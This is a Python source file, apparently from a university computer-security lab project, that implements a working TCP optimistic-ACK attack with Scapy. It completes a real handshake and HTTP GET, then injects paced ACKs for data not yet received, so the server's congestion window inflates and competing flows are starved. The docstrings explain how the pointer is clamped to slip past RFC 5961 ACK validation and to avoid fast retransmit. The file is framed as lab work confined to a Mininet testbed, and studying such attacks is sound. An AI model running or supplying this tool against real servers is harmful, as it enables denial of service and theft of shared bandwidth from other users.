#!/usr/bin/env python3
"""
optimistic_client.py — Paced TCP Optimistic ACK Generator (h2: 10.0.0.3)
CSE 406: Computer Security Lab Project

Performs a legitimate TCP 3-way handshake and HTTP GET, then injects ACK
segments *optimistically* — acknowledging data the server has sent but that
the attacker has NOT necessarily received yet. This is the essence of the
optimistic-ACK attack (Savage et al., 1999): by ACKing faster than the
bottleneck can actually deliver, the receiver hides congestion loss from the
sender, so the sender never backs off and its congestion window inflates far
beyond the path's capacity — starving competing honest flows.

Why "optimistic" and not just "fast" (the bug this fixes)
---------------------------------------------------------
An earlier version only ACKed the highest sequence number it had actually
*received* (``server_snd_nxt`` from the sniffer). Under an inflated cwnd the
bottleneck overflows and drops the tail of every burst; those bytes never
reach the attacker, so its ACKs stall, the server sees the loss (RTO) and
**collapses** its cwnd. The attack destroyed itself instead of stealing
bandwidth. To actually steal, the attacker must ACK *past the gaps* — cover
the dropped/in-flight tail — so the server never detects loss.

Staying inside the kernel's ACK-validation rules
-------------------------------------------------
A receiver may not ACK data the sender has not sent: an ACK above the
server's ``snd_nxt`` is invalid. Linux (RFC 5961) answers such an ACK with a
challenge ACK and ignores it — persistent over-ACKing simply stalls the
connection. So the optimistic pointer is **clamped** to ``rcv_high +
max_lead``: it runs ahead of confirmed-received data (to hide loss) but never
more than one inflated window ahead, keeping it at or below the server's true
snd_max the vast majority of the time. The rare, transient overshoot is
harmless (a single ignored ACK), and we never send a duplicate/stale ACK
(which would trigger fast-retransmit).

All traffic stays within the isolated Mininet testbed.
"""

import argparse
import logging
import signal
import sys
import threading
import time

from scapy.all import (
    IP, TCP, Raw, send, sr1, sniff, conf, RandShort
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [OptACK] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("optimistic_client")

conf.verb = 0

MSS = 1460
# Cap the raw ACK packet rate so Scapy can keep up; when the target
# bandwidth needs a higher rate we advance more bytes per ACK instead.
MAX_ACK_HZ = 600


class OptimisticACKClient:
    """
    Paced optimistic-ACK attacker.

    Strategy
    --------
    1. Complete a real TCP handshake + HTTP GET (kernel RST is dropped by an
       iptables rule set up in topology.py so Scapy owns the connection).
    2. A background sniffer tracks ``rcv_high`` — the highest byte the server
       has actually delivered to us (past the bottleneck).
    3. An open-loop pointer advances at the target steal-rate and ACKs that
       point *regardless of what we have received*, hiding bottleneck loss.
    4. The pointer is clamped to ``rcv_high + max_lead`` so it stays at/below
       the server's real snd_max — never tripping RFC 5961 ACK validation.
    5. Only strictly-advancing ACKs are sent (no duplicate ACKs).
    """

    def __init__(self, server_ip, server_port, src_port, target_bw_mbps,
                 duration, multiplier):
        self.server_ip = server_ip
        self.server_port = server_port
        self.src_port = src_port
        self.target_bw_mbps = target_bw_mbps
        self.duration = duration
        self.multiplier = multiplier

        self.c0 = int(RandShort()) << 16 | int(RandShort())
        self.s0 = None
        self.client_seq = None

        # Tracked state (updated by sniffer thread)
        self.lock = threading.Lock()
        self.server_snd_nxt = 0     # rcv_high: highest (seq + payload_len) delivered
        self.last_acked = 0         # last ack_seq we actually sent
        self.data_pkts_seen = 0
        self.total_server_bytes = 0

        # Measured from handshake
        self.measured_rtt = None

        self.running = False
        self.sniffer_thread = None

        self.stats = {
            "acks_sent": 0,
            "bytes_claimed": 0,
            "optimistic_acks": 0,   # ACKs that ran ahead of received data
            "overshoot_holds": 0,   # ticks the clamp held us back
        }

    # ------------------------------------------------------------------
    # Sequence number arithmetic (handles 32-bit wraparound)
    # ------------------------------------------------------------------
    @staticmethod
    def seq_after(a, b):
        """True if a > b in 32-bit sequence space."""
        return ((a - b) & 0xFFFFFFFF) != 0 and ((a - b) & 0xFFFFFFFF) < 0x80000000

    @staticmethod
    def seq_max(a, b):
        return a if OptimisticACKClient.seq_after(a, b) else b

    @staticmethod
    def seq_min(a, b):
        return b if OptimisticACKClient.seq_after(a, b) else a

    # ------------------------------------------------------------------
    # TCP Handshake — also measures RTT
    # ------------------------------------------------------------------
    def handshake(self):
        log.info("Starting 3-way handshake to %s:%d", self.server_ip,
                 self.server_port)

        syn = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.c0, flags="S",
                  options=[("MSS", MSS), ("WScale", 7)])
        )

        t0 = time.monotonic()
        syn_ack = sr1(syn, timeout=5)
        self.measured_rtt = time.monotonic() - t0

        if syn_ack is None or not syn_ack.haslayer(TCP):
            log.error("No SYN-ACK received — is the server running?")
            sys.exit(1)
        if syn_ack[TCP].flags != 0x12:
            log.error("Unexpected flags: 0x%02x", syn_ack[TCP].flags)
            sys.exit(1)

        self.s0 = syn_ack[TCP].seq
        initial_ack = (self.s0 + 1) & 0xFFFFFFFF
        self.last_acked = initial_ack
        self.server_snd_nxt = initial_ack
        self.client_seq = (self.c0 + 1) & 0xFFFFFFFF

        ack = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, ack=initial_ack,
                  flags="A", window=65535)
        )
        send(ack)

        log.info("Handshake complete — server ISN=%d, measured RTT=%.1f ms",
                 self.s0, self.measured_rtt * 1000)

    # ------------------------------------------------------------------
    # HTTP GET
    # ------------------------------------------------------------------
    def send_get(self, path="/video.mp4"):
        http_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.server_ip}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        payload = http_req.encode()
        pkt = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, ack=self.last_acked,
                  flags="PA", window=65535)
            / Raw(load=payload)
        )
        send(pkt)
        self.client_seq = (self.client_seq + len(payload)) & 0xFFFFFFFF
        log.info("Sent HTTP GET %s", path)

    # ------------------------------------------------------------------
    # Background sniffer — tracks rcv_high (highest byte actually delivered)
    # ------------------------------------------------------------------
    def _sniffer_callback(self, pkt):
        if not pkt.haslayer(TCP):
            return
        tcp = pkt[TCP]
        if tcp.sport != self.server_port or tcp.dport != self.src_port:
            return

        seq = tcp.seq
        payload_len = len(pkt[TCP].payload) if pkt[TCP].payload else 0

        if payload_len > 0:
            new_nxt = (seq + payload_len) & 0xFFFFFFFF
            with self.lock:
                self.server_snd_nxt = self.seq_max(self.server_snd_nxt,
                                                   new_nxt)
                self.data_pkts_seen += 1
                self.total_server_bytes += payload_len

    def start_sniffer(self):
        bpf = (f"tcp and src host {self.server_ip} and src port "
               f"{self.server_port} and dst port {self.src_port}")

        def _run():
            sniff(filter=bpf, prn=self._sniffer_callback,
                  stop_filter=lambda _: not self.running,
                  store=False, timeout=self.duration + 10)

        self.sniffer_thread = threading.Thread(target=_run, daemon=True)
        self.sniffer_thread.start()

    # ------------------------------------------------------------------
    # Compute attack parameters from link characteristics
    # ------------------------------------------------------------------
    def compute_parameters(self):
        """Return (ack_interval_s, advance_per_ack_bytes, max_lead_bytes)."""
        rtt = self.measured_rtt if self.measured_rtt else 0.1
        bw_bytes = self.target_bw_mbps * 1e6 / 8

        bdp_bytes = bw_bytes * rtt
        bdp_segments = max(int(bdp_bytes / MSS), 1)

        # How far ahead of confirmed-received data we allow the optimistic
        # pointer to run: about one *inflated* window. Big enough to cover the
        # bottleneck's stuck/dropped tail, bounded enough that we stay at or
        # below the server's real snd_max (so ACKs stay valid).
        max_lead = int(bdp_segments * self.multiplier) * MSS

        # Target ACK-advance rate = bandwidth we want the server to pour into
        # the bottleneck. Pace it into <= MAX_ACK_HZ packets/sec, advancing
        # more bytes per ACK if a single-MSS-per-ACK rate would exceed that.
        ack_hz = min(bw_bytes / MSS, MAX_ACK_HZ)
        ack_hz = max(ack_hz, 1.0)
        ack_interval = 1.0 / ack_hz
        advance_per_ack = max(int(bw_bytes / ack_hz), MSS)

        log.info("=== Attack parameters (auto-computed) ===")
        log.info("  Measured RTT:      %.1f ms", rtt * 1000)
        log.info("  Target steal BW:   %d Mbps", self.target_bw_mbps)
        log.info("  BDP:               %d segments (%d bytes)",
                 bdp_segments, int(bdp_bytes))
        log.info("  Max optimistic lead: %d bytes (%.1fx BDP)",
                 max_lead, self.multiplier)
        log.info("  ACK rate:          %.0f ACKs/sec", ack_hz)
        log.info("  Advance per ACK:   %d bytes", advance_per_ack)
        log.info("  ACK interval:      %.2f ms", ack_interval * 1000)

        return ack_interval, advance_per_ack, max_lead

    # ------------------------------------------------------------------
    # Paced optimistic ACK injection loop
    # ------------------------------------------------------------------
    def inject_acks(self):
        self.running = True
        self.start_sniffer()

        time.sleep(0.5)
        ack_interval, advance_per_ack, max_lead = self.compute_parameters()

        start_time = time.monotonic()
        log.info("Starting paced optimistic ACK injection for %d s", self.duration)

        # The optimistic pointer starts at the handshake ACK and marches
        # forward on its own clock, independent of what we receive.
        opt_ptr = self.last_acked
        last_log_time = start_time

        while self.running:
            elapsed = time.monotonic() - start_time
            if elapsed >= self.duration:
                break

            with self.lock:
                rcv_high = self.server_snd_nxt
                current_acked = self.last_acked

            # Advance the open-loop pointer at the target steal-rate ...
            desired = (current_acked + advance_per_ack) & 0xFFFFFFFF
            # ... but never further than one inflated window past data we
            # have actually seen delivered (keeps us <= server snd_max).
            clamp = (rcv_high + max_lead) & 0xFFFFFFFF
            new_ack = self.seq_min(desired, clamp)

            if self.seq_after(new_ack, current_acked):
                ack_pkt = (
                    IP(dst=self.server_ip)
                    / TCP(sport=self.src_port, dport=self.server_port,
                          seq=self.client_seq, ack=new_ack,
                          flags="A", window=65535)
                )
                send(ack_pkt)

                advance = (new_ack - current_acked) & 0xFFFFFFFF
                with self.lock:
                    self.last_acked = new_ack
                opt_ptr = new_ack

                self.stats["acks_sent"] += 1
                self.stats["bytes_claimed"] += advance
                if self.seq_after(new_ack, rcv_high):
                    self.stats["optimistic_acks"] += 1
            else:
                # Clamp is holding us back: the server has not sent far enough
                # ahead yet. Wait for more data rather than emit a stale/dup
                # ACK (which would trigger fast-retransmit at the server).
                self.stats["overshoot_holds"] += 1

            now = time.monotonic()
            if now - last_log_time >= 5.0:
                with self.lock:
                    pkts = self.data_pkts_seen
                    total = self.total_server_bytes
                    rh = self.server_snd_nxt
                log.info(
                    "t=%.0fs | ACKs=%d (optimistic=%d, holds=%d) | "
                    "server_data=%d pkts (%.1f MB) | claimed=%.1f MB | "
                    "lead=+%d B",
                    elapsed, self.stats["acks_sent"],
                    self.stats["optimistic_acks"], self.stats["overshoot_holds"],
                    pkts, total / 1e6, self.stats["bytes_claimed"] / 1e6,
                    (self.last_acked - rh) & 0xFFFFFFFF)
                last_log_time = now

            time.sleep(ack_interval)

        self.running = False
        self._print_summary(time.monotonic() - start_time)

    def _print_summary(self, total_time):
        with self.lock:
            total_server = self.total_server_bytes
            data_pkts = self.data_pkts_seen

        log.info("=== Injection summary ===")
        log.info("Duration:         %.1f s", total_time)
        log.info("ACKs sent:        %d (optimistic: %d, clamp-holds: %d)",
                 self.stats["acks_sent"], self.stats["optimistic_acks"],
                 self.stats["overshoot_holds"])
        log.info("Bytes claimed:    %d (%.2f MB)",
                 self.stats["bytes_claimed"],
                 self.stats["bytes_claimed"] / 1e6)
        log.info("Server data seen: %d pkts (%.2f MB)",
                 data_pkts, total_server / 1e6)
        if total_time > 0:
            claimed_bw = self.stats["bytes_claimed"] * 8 / total_time / 1e6
            delivered_bw = total_server * 8 / total_time / 1e6
            log.info("Claimed ACK rate:  %.2f Mbps", claimed_bw)
            log.info("Delivered goodput: %.2f Mbps", delivered_bw)
        log.info("Effective ACK rate: %.0f ACKs/s",
                 self.stats["acks_sent"] / max(total_time, 0.001))

    # ------------------------------------------------------------------
    # Teardown
    # ------------------------------------------------------------------
    def teardown(self):
        fin = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, ack=self.last_acked,
                  flags="FA", window=65535)
        )
        send(fin)
        log.info("FIN sent — connection teardown initiated")

    def stop(self):
        self.running = False


def main():
    parser = argparse.ArgumentParser(
        description="Paced TCP Optimistic ACK generator for CSE 406 lab"
    )
    parser.add_argument("--server", default="10.0.1.2",
        help="Target server IP (default: 10.0.1.2)")
    parser.add_argument("--port", type=int, default=80,
        help="Target server port (default: 80)")
    parser.add_argument("--sport", type=int, default=44444,
        help="Source port (default: 44444)")
    parser.add_argument("--target-bw", type=int, default=20,
        help="Bandwidth to steal via optimistic ACKing, Mbps (default: 20)")
    parser.add_argument("--multiplier", type=float, default=2.0,
        help="Max optimistic lead as a multiple of BDP (default: 2.0)")
    parser.add_argument("--duration", type=int, default=60,
        help="Attack duration in seconds (default: 60)")
    # Legacy args (ignored, kept for compatibility with run_experiment.sh)
    parser.add_argument("--delta", type=int, default=0)
    parser.add_argument("--rate", type=float, default=0)
    args = parser.parse_args()

    client = OptimisticACKClient(
        server_ip=args.server,
        server_port=args.port,
        src_port=args.sport,
        target_bw_mbps=args.target_bw,
        duration=args.duration,
        multiplier=args.multiplier,
    )

    def sigint_handler(sig, frame):
        log.info("SIGINT received — stopping injection")
        client.stop()

    signal.signal(signal.SIGINT, sigint_handler)

    client.handshake()
    time.sleep(0.5)
    client.send_get()
    time.sleep(1.0)
    client.inject_acks()
    client.teardown()


if __name__ == "__main__":
    main()
